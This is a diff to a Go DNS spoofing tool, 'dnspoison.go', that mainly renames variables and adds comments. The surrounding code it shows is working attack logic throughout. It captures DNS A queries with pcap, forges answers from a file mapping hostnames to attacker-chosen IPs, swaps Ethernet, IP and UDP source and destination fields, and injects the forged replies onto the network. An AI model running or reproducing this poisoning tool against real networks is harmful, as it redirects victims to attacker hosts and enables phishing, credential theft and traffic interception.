@@ -19,15 +19,15 @@ var (
 	defaultIP     net.IP
 	ipHostMapping map[string]string
 
-	decoder       *gopacket.DecodingLayerParser
-	decodedLayers []gopacket.LayerType
-	serialOpts    gopacket.SerializeOptions
-	serialBuf     gopacket.SerializeBuffer
+	parser     *gopacket.DecodingLayerParser
+	decoded    []gopacket.LayerType
+	serialOpts gopacket.SerializeOptions
+	serialBuf  gopacket.SerializeBuffer
 
-	ethLayer  layers.Ethernet
-	ipv4Layer layers.IPv4
-	udpLayer  layers.UDP
-	dnsLayer  layers.DNS
+	eth  layers.Ethernet
+	ipv4 layers.IPv4
+	udp  layers.UDP
+	dns  layers.DNS
 )
 
 // go run dnspoison.go [-i interface] [-f hostnames] [expression]
@@ -47,11 +47,10 @@ func main() {
 	ipHostMapping = readMapping(hostFile) // read ip host mapping from file
 
 	setupDecoder()
-
 	for {
-		packetData, _, _ := handle.ReadPacketData()
-		err = decoder.DecodeLayers(packetData, &decodedLayers)
-		if len(decodedLayers) != 4 || dnsLayer.QR { // if QR = 1, means its a DNS response packet
+		packetData, _, _ := handle.ReadPacketData() // read the next packet from the pcap handle
+		err = parser.DecodeLayers(packetData, &decoded)
+		if len(decoded) != 4 || dns.QR { // if QR = 1, means it is a DNS response packet
 			continue
 		}
 
@@ -127,8 +126,10 @@ func readMapping(filename string) map[string]string {
 }
 
 func setupDecoder() {
-	decoder = gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &ethLayer, &ipv4Layer, &udpLayer, &dnsLayer)
-	decodedLayers = make([]gopacket.LayerType, 0, 4)
+	// Here we use Fast Decoding With DecodingLayerParser,
+	// which takes about 10% of the time as NewPacket to decode packet data.
+	parser = gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &eth, &ipv4, &udp, &dns)
+	decoded = make([]gopacket.LayerType, 0, 4)
 	serialBuf = gopacket.NewSerializeBuffer()
 	serialOpts = gopacket.SerializeOptions{
 		FixLengths:       true,
@@ -138,21 +139,21 @@ func setupDecoder() {
 
 func handlePackets(handle *pcap.Handle) {
 	fmt.Println("========== Packet captured! ==========")
-	fmt.Printf("DNS questions: total %v\n", dnsLayer.QDCount)
+	fmt.Printf("DNS questions: total %v\n", dns.QDCount)
 	var i uint16
-	for i = 0; i < dnsLayer.QDCount; i++ {
-		fmt.Printf("[%v]: %v", i, string(dnsLayer.Questions[i].Name))
+	for i = 0; i < dns.QDCount; i++ {
+		fmt.Printf("[%v]: %v", i, string(dns.Questions[i].Name))
 	}
 
-	dnsLayer.QR = true // QR: true indicates a response packet
-	if dnsLayer.RD {   // RD(Recursion Desired): is set in a query and is copied into the response.
-		dnsLayer.RA = true // RA(Recursion Available): indicates recursive query is available in the name server.
+	dns.QR = true // QR: true indicates a response packet
+	if dns.RD {   // RD(Recursion Desired): is set in a query and is copied into the response.
+		dns.RA = true // RA(Recursion Available): indicates recursive query is available in the name server.
 	}
 
 	matched := false
 	var q layers.DNSQuestion
-	for i = 0; i < dnsLayer.QDCount; i++ { // iterate through questions
-		q = dnsLayer.Questions[i]
+	for i = 0; i < dns.QDCount; i++ { // iterate through questions
+		q = dns.Questions[i]
 		if q.Type != layers.DNSTypeA || q.Class != layers.DNSClassIN {
 			continue
 		}
@@ -161,9 +162,9 @@ func handlePackets(handle *pcap.Handle) {
 		if a.IP != nil {
 			matched = true
 			fmt.Printf("forged: type %v, [%v] -> [%v]", a.Type, string(q.Name), a.IP)
-			dnsLayer.Answers = append(dnsLayer.Answers, a)
-			dnsLayer.ANCount = dnsLayer.ANCount + 1
-			fmt.Printf("DNS answer total: %v\n", dnsLayer.ANCount)
+			dns.Answers = append(dns.Answers, a)
+			dns.ANCount = dns.ANCount + 1
+			fmt.Printf("DNS answer total: %v\n", dns.ANCount)
 		}
 	}
 	if matched == false {
@@ -173,8 +174,8 @@ func handlePackets(handle *pcap.Handle) {
 	// swap src/dst in each layer
 	swapSrcDst()
 	// serialize packets
-	_ = udpLayer.SetNetworkLayerForChecksum(&ipv4Layer)
-	_ = gopacket.SerializeLayers(serialBuf, serialOpts, &ethLayer, &ipv4Layer, &udpLayer, &dnsLayer)
+	_ = udp.SetNetworkLayerForChecksum(&ipv4)
+	_ = gopacket.SerializeLayers(serialBuf, serialOpts, &eth, &ipv4, &udp, &dns)
 	// write packet
 	err := handle.WritePacketData(serialBuf.Bytes())
 	if err != nil {
@@ -207,17 +208,17 @@ func getForgedIp(queryName string) net.IP {
 
 func swapSrcDst() {
 	// swap src/dst mac
-	tmpMac := ethLayer.SrcMAC
-	ethLayer.SrcMAC = ethLayer.DstMAC
-	ethLayer.DstMAC = tmpMac
+	tmpMac := eth.SrcMAC
+	eth.SrcMAC = eth.DstMAC
+	eth.DstMAC = tmpMac
 	// swap src/dst ip
-	tmpIP := ipv4Layer.SrcIP
-	ipv4Layer.SrcIP = ipv4Layer.DstIP
-	ipv4Layer.DstIP = tmpIP
-	fmt.Printf("IP: src %v, dst %v\n", ipv4Layer.SrcIP, ipv4Layer.DstIP)
+	tmpIP := ipv4.SrcIP
+	ipv4.SrcIP = ipv4.DstIP
+	ipv4.DstIP = tmpIP
+	fmt.Printf("IP: src %v, dst %v\n", ipv4.SrcIP, ipv4.DstIP)
 	// swap src/dst udp ports
-	tmpPort := udpLayer.SrcPort
-	udpLayer.SrcPort = udpLayer.DstPort
-	udpLayer.DstPort = tmpPort
-	fmt.Printf("UDP port: src %v, dst %v\n", udpLayer.SrcPort, udpLayer.DstPort)
+	tmpPort := udp.SrcPort
+	udp.SrcPort = udp.DstPort
+	udp.DstPort = tmpPort
+	fmt.Printf("UDP port: src %v, dst %v\n", udp.SrcPort, udp.DstPort)
 }
